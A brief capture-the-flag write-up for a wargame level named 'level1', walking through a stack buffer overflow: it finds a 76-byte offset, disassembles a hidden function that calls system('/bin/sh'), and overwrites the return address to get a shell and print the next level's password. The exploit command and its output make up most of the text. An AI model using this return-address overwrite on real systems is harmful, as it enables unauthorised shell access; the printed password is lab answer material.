For this one, we use our first bufferoverflow!
First, we try to make the executable segfault :
```bash
(python -c "print 'A' * 76" ; cat) | ./level1
Illegal instruction (core dumped)
```

At this point, we know the buffer size which is equal to `76`. Now we try to decompile with `objdump -d ./level1` :
```asm
08048444 <run>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
 804844f:	89 c2                	mov    %eax,%edx
 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
 8048461:	00 
 8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
 8048469:	00 
 804846a:	89 04 24             	mov    %eax,(%esp)
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret 
```

We see here a function which is not called by the `main` but execute a `system('/bin/sh')`. The idea is to place the `0x8048444` run's address in the bufferoverflow :
```bash
(python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1
Good... Wait what?
whoami
level2
cd .. && cat level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```